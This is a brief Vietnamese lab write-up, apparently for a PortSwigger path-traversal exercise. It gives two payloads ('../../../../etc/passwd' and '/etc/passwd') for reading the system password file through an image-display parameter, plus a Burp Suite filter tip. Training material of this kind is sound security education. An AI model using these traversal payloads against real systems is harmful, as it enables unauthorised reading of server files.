# Lab: File path traversal, simple case
Bài thực hành này chứa lỗ hổng bảo mật đường dẫn trong việc hiển thị hình ảnh sản phẩm.

Để giải quyết bài thực hành, hãy truy xuất nội dung của tệp `/etc/passwd.`

Playload 1
```
../../../../etc/passwd
```
Playload 2
```
/etc/passwd
```
* Trong Filter settings của Burp Suite, chọn Show all để thấy toàn bộ ảnh, css ...  
<img src="/workspaces/portswigger/path-traversal/img/Screenshot 2025-07-23 at 22.40.11.png" width="400">
